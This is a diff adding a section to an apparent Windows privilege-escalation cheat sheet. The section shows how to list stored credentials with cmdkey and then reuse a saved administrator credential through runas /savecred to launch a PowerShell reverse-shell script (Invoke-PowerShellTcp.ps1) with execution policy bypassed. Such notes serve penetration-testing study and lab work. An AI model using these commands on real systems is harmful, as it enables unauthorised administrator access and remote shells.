@@ -104,6 +104,19 @@ qwinsta
 cmdkey /list
 ````
 
+## Get stored credentials
+````
+> cmdkey /list
+Currently stored credentials:
+    Target: Domain:interactive=ACCESS\Administrator
+                               Type: Domain Password
+    User: ACCESS\Administrator
+````
+And use them
+````
+runas /user:ACCESS\administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\Users\security\AppData\Local\Temp\Invoke-PowerShellTcp.ps1"
+````
+
 ## Network info
 ````
 ipconfig /all
